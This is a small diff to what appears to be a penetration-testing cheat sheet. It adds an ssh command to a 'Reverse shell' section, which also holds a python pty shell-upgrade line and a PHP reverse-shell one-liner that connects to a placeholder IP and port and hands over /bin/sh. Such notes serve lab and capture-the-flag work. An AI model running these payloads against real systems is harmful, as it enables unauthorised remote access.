@@ -93,7 +93,8 @@ and when you logging in you see all notes
 
 ### Reverse shell ###  
 # upgrade reverse shell 
-python -c 'import pty; pty.spawn("/bin/bash")'  
+python -c 'import pty; pty.spawn("/bin/bash")'    
+ssh user@10.10.10.51 -t "bash"  
 
 #reverse shell php  
 php -r '$s=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'  
